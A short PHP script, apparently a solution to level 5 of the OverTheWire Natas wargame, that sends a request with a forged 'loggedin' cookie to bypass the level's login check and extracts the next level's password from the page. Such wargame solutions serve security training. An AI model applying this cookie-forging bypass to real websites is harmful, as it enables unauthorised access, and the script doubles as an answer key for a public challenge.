<?php
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\setCookie;

require_once dirname(__DIR__) . '/bootstrap.php';

$level = 5;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$jar = new CookieJar();
$jar->setCookie(new SetCookie([
    'Name' => 'loggedin',
    'Value' => 1,
    'Domain' => 'natas5.natas.labs.overthewire.org',
]));

$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
    'cookies' => $jar,
]);

$body = (string)$response->getBody();
preg_match('/Access granted\. The password for natas6 is (.*)<\/div>/', $body, $flag);
echo $flag[1];
